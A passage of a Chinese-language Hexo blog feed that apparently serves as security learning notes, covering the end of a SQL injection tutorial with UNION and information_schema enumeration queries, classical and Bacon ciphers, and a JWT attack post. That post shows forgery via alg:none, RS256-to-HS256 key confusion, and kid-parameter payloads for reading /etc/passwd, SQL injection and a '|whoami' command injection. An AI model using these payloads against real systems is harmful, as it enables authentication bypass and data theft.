在数据库中表示查询结果依据第n列进行排名.<br>n不断增1，直到报错为之</p></li><li><p>判断回显字段<br>在知道n之后，如果数据库为MySql,我们用union select 1，2，3，…，n。<br>       如果数据库为其他， 我们用union select null,null,null,…null,n各null</p></li><li><p>在知道回显字段后<br>(1).查询数据库名<br>(2).查询相应数据库的所有表<br>(3).查询相应数据库的表的所有列<br>(4).查询对应数据库的对应表的对应列的信息</p></li></ol><p>  例如MySql(版本&gt;5.0):<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询数据库：</span><br><span class="line">select group_concat(table_schema) from information_schema.tables</span><br><span class="line">查询相应数据库的所有表：</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&#x27;DBS&#x27;</span><br><span class="line">查询所查表对应的所有列:</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_schema=&#x27;DBS&#x27;and table_name=&#x27;TB&#x27;</span><br><span class="line">查询列的所有信息:</span><br><span class="line">select group_concat(*) from DBS.TB where COLUMNS=&#x27;****&#x27;</span><br></pre></td></tr></table></figure></p><h2 id="XML报错注入"><a href="#XML报错注入" class="headerlink" title="XML报错注入"></a>XML报错注入</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;几个常用数据库的特性&quot;&gt;&lt;a href=&quot;#几个常用数据库的特性&quot; class=&quot;headerlink&quot; title=&quot;几个常用数据库的特性&quot;&gt;&lt;/a&gt;几个常用数据库的特性&lt;/h1&gt;&lt;p&gt;  每一种数据库都有他的特性，这里简单介绍一些主流的数据库的特性，MySql</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>古典密码</title>
    <link href="http://example.com/2023/02/18/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"/>
    <id>http://example.com/2023/02/18/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</id>
    <published>2023-02-18T01:30:20.000Z</published>
    <updated>2023-02-18T02:18:08.363Z</updated>
    
    <content type="html"><![CDATA[<h2 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h2><p>置换密码又称为移位密码，即把明文中的字母重新排列，字母本身不变，只是位置变了 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;置换密码&quot;&gt;&lt;a href=&quot;#置换密码&quot; class=&quot;headerlink&quot; title=&quot;置换密码&quot;&gt;&lt;/a&gt;置换密码&lt;/h2&gt;&lt;p&gt;置换密码又称为移位密码，即把明文中的字母重新排列，字母本身不变，只是位置变了 &lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>培根密码</title>
    <link href="http://example.com/2023/02/07/%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81/"/>
    <id>http://example.com/2023/02/07/%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81/</id>
    <published>2023-02-07T11:15:11.000Z</published>
    <updated>2023-02-07T13:47:23.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="培根密码加密原理"><a href="#培根密码加密原理" class="headerlink" title="培根密码加密原理"></a>培根密码加密原理</h1><p>培根密码是一种简单的代替密码，只用 a与b 或者 大写与小写 或者 0与1 正体与 <em>斜体</em> 等等 <em>（只要是对立的两面元素都可以，不过大多数我们都使用a，b表示）</em> 来代替26个英文字母。如下：</p><table><thead><tr><th align="center">字母</th><th align="center">培根码</th></tr></thead><tbody><tr><td align="center">A&#x2F;a</td><td align="center">aaaaa</td></tr><tr><td align="center">B&#x2F;b</td><td align="center">aaaab</td></tr><tr><td align="center">C&#x2F;c</td><td align="center">aaaba</td></tr><tr><td align="center">D&#x2F;d</td><td align="center">aaabb</td></tr><tr><td align="center">E&#x2F;e</td><td align="center">aabaa</td></tr><tr><td align="center">F&#x2F;f</td><td align="center">aabab</td></tr><tr><td align="center">G&#x2F;g</td><td align="center">aabba</td></tr><tr><td align="center">H&#x2F;h</td><td align="center">aabbb</td></tr><tr><td align="center">I&#x2F;i</td><td align="center">abaaa</td></tr><tr><td align="center">J&#x2F;j</td><td align="center">abaab</td></tr><tr><td align="center">K&#x2F;k</td><td align="center">ababa</td></tr><tr><td align="center">L&#x2F;l</td><td align="center">ababb</td></tr><tr><td align="center">M&#x2F;m</td><td align="center">abbaa</td></tr><tr><td align="center">N&#x2F;n</td><td align="center">abbab</td></tr><tr><td align="center">O&#x2F;o</td><td align="center">abbba</td></tr><tr><td align="center">P&#x2F;p</td><td align="center">abbbb</td></tr><tr><td align="center">Q&#x2F;q</td><td align="center">baaaa</td></tr><tr><td align="center">R&#x2F;r</td><td align="center">baaab</td></tr><tr><td align="center">S&#x2F;s</td><td align="center">baaba</td></tr><tr><td align="center">T&#x2F;t</td><td align="center">baabb</td></tr><tr><td align="center">U&#x2F;u</td><td align="center">babaa</td></tr><tr><td align="center">V&#x2F;v</td><td align="center">babab</td></tr><tr><td align="center">W&#x2F;w</td><td align="center">babba</td></tr><tr><td align="center">X&#x2F;x</td><td align="center">babbb</td></tr><tr><td align="center">Y&#x2F;y</td><td align="center">bbaaa</td></tr><tr><td align="center">Z&#x2F;z</td><td align="center">bbaab</td></tr></tbody></table><p>这种加密方式类似二进制，从a(00000)依次＋1一直到z（11001，B26）.</p><p>比如 : </p><table><thead><tr><th align="center">S</th><th align="center">H</th><th align="center">U</th><th align="center">A</th><th align="center">N</th><th align="center">G</th></tr></thead><tbody><tr><td align="center">baaba</td><td align="center">aabbb</td><td align="center">babaa</td><td align="center">aaaaa</td><td align="center">abbab</td><td align="center">aabba</td></tr></tbody></table><p>另外，培根密码很多用作隐写<br>比如：</p><table><thead><tr><th align="center">源码</th><th align="center">按大小写，转换</th><th align="center">最后培根解码得到</th></tr></thead><tbody><tr><td align="center">I kNoW You Can COunT On ME.</td><td align="center">A BABA ABB ABB AABBA AB AA.</td><td align="center">LOVE</td></tr></tbody></table><p>培根加解密链接：<a href="http://www.hiencode.com/baconian.html">bacon</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;培根密码加密原理&quot;&gt;&lt;a href=&quot;#培根密码加密原理&quot; class=&quot;headerlink&quot; title=&quot;培根密码加密原理&quot;&gt;&lt;/a&gt;培根密码加密原理&lt;/h1&gt;&lt;p&gt;培根密码是一种简单的代替密码，只用 a与b 或者 大写与小写 或者 0与1 正体与 &lt;em&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>JWT攻击</title>
    <link href="http://example.com/2023/02/05/JWT%E6%94%BB%E5%87%BB/"/>
    <id>http://example.com/2023/02/05/JWT%E6%94%BB%E5%87%BB/</id>
    <published>2023-02-05T07:39:44.000Z</published>
    <updated>2023-02-07T13:42:25.177Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JWT是什么"><a href="#JWT是什么" class="headerlink" title="JWT是什么"></a>JWT是什么</h2><p>JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法<br>官网：<a href="https://jwt.io/">jwt</a></p><h2 id="JWT构成"><a href="#JWT构成" class="headerlink" title="JWT构成"></a>JWT构成</h2><p>JWT一般由三段数据组成，用 . 分隔每段数据，类似于这样：<br><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlhpYW8gU2h1YW5nIiwiaWF0IjoxNTE2MjM5MDIyfQ.VI3Sw0K6anPxdipgkfF0tqWWJcmcx-QaCN6Lh0x89Tw</code><br>第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature).  </p><h3 id="header（标头）"><a href="#header（标头）" class="headerlink" title="header（标头）"></a>header（标头）</h3><p>完整头部header类似这样：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>声明加密算法</p></li><li><p>声明类型</p></li></ul><p>然后对其进行base64加密得到第一部分</p><h3 id="payload（载荷）"><a href="#payload（载荷）" class="headerlink" title="payload（载荷）"></a>payload（载荷）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;Xiao Shuang&quot;,</span><br><span class="line">    &quot;iat&quot;: 1516239022</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后base64加密得到第二部分<br>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分</p><ul><li><p>标准中注册的声明</p></li><li><p>公共的声明</p></li><li><p>私有的声明</p></li></ul><p><strong>标准中注册的声明:</strong></p><ul><li><p>iss:jwt签发者</p></li><li><p>sub:jwt所面向的用户</p></li><li><p>aud:接受jwt的一方</p></li><li><p>exp: jwt的过期时间，这个过期时间必须要大于签发时间</p></li><li><p>nbf: 定义在什么时间之前，该jwt都是不可用的</p></li><li><p>iat: jwt的签发时间</p></li><li><p>jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</p></li></ul><p><strong>公共的声明:</strong><br>公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密  </p><p><strong>私有的声明:</strong><br>私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息  </p><h3 id="signature（签名）"><a href="#signature（签名）" class="headerlink" title="signature（签名）"></a>signature（签名）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">    base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">    base64UrlEncode(payload),</span><br><span class="line">    your-256-bit-secret</span><br><span class="line">) </span><br></pre></td></tr></table></figure><p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</p><ul><li><p>header  (base64)</p></li><li><p>payload (base64)</p></li><li><p>secret</p></li></ul><p>这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。secret是密钥，储存在cookie里。</p><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p><img src="/images/jwt1.jpg" alt="JWT认证" title="jwt认证"><br>用户登录成功之后，服务端给用户浏览器返回一个token，以后用户浏览器要携带token再去向服务端发送请求，服务端校验token的合法性，合法则给用户看数据，否则，返回一些错误信息。</p><h3 id="传统token方式和jwt在认证方面有什么差异？"><a href="#传统token方式和jwt在认证方面有什么差异？" class="headerlink" title="传统token方式和jwt在认证方面有什么差异？"></a>传统token方式和jwt在认证方面有什么差异？</h3><ul><li><p>传统token方式:<br>用户登录成功后，服务端生成一个随机token给用户，并且在服务端(数据库或缓存)中保存一份token，以后用户再来访问时需携带token，服务端接收到token之后，去数据库或缓存中进行校验token的是否超时、是否合法。</p></li><li><p>jwt方式：<br>用户登录成功后，服务端通过jwt生成一个随机token给用户（服务端无需保留token），以后用户再来访问时需携带token，服务端接收到token之后，通过jwt对token进行校验是否超时、是否合法。</p></li></ul><h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><ul><li><p><strong>签名加密算法</strong><br>  jwt是支持空签名加密算法的，即header中alg为none，这样的话，只要把signature设置为空（即不添加signature字段），即此时jwt为两端数据，而非三段，只要提交到服务器，任何token都可以通过服务器的验证。</p><p>  空加密算法的设计初衷是用于调试的，但是如果某天开发人员脑阔瓦特了(•_•)，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p></li><li><p><strong>将RS256算法改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）</strong>  </p><p>  RSA是非对称密码算法，用私钥pem加密发送给服务器端，服务器端再用公钥pub进行验证，由于私钥pem几乎是无法获取得知的，而pub是可以通过一些方法得到的。  </p><p>  HMAC是哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。即客户端和服务端都用共同的密钥进行加密或者解密。  </p><p>  于是我们可以先利用RSA对jwt token进行签名发送给服务端，通过某些方式获取到公钥pub，再将RSA算法转换为HMAC算法，使用刚才获取到的pub作为HMAC的密钥进行JWT token的签名，即可完成用户身份伪造。</p></li><li><p><strong>若密钥爆破</strong><br>  凡是有密码，就可以有爆破，这取决于你的字典。<br>  在对jwt进行密钥爆破时一定在此情况下进行：</p><p>  1.已知签名算法</p><p>  2.一段有效的，已签名的token</p><p>  3.弱密钥</p></li></ul><p>这样很大的概率可以爆破出密钥，具体算法实现可参考：<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>  </p><ul><li><strong>修改kid参数</strong></li></ul><p>kid是jwt header中的一个可选参数，全称是key ID，它用于指定加密算法的密钥</p><p>由于该参数可以由用户修改，所以会造成相应的安全问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;/home/jwt/.ssh/pem&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1.任意文件读取"></a>1.任意文件读取</h3><p>kid参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;/etc/passwd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p>kid也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;key0123456&#x27; || union select &#x27;secretkey&#x27; -- &quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-命令注入"><a href="#3-命令注入" class="headerlink" title="3.命令注入"></a>3.命令注入</h3><p>对kid参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了open函数，通过构造参数就可能造成命令注入。</p><p><code>&quot;/path/to/key_file|whoami&quot;</code></p><h3 id="4-信息泄露"><a href="#4-信息泄露" class="headerlink" title="4.信息泄露"></a>4.信息泄露</h3><p>JWT保证的是数据传输过程中的完整性而不是机密性。</p><p>由于payload是使用base64url编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行base64url解码，就可以读取到payload中携带的信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JWT是什么&quot;&gt;&lt;a href=&quot;#JWT是什么&quot; class=&quot;headerlink&quot; title=&quot;JWT是什么&quot;&gt;&lt;/a&gt;JWT是什么&lt;/h2&gt;&lt;p&gt;JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/01/30/hello-world/"/>
    <id>http://example.com/2023/01/30/hello-world/</id>
    <published>2023-01-30T07:52:09.038Z</published>
    <updated>2023-01-30T07:52:09.038Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
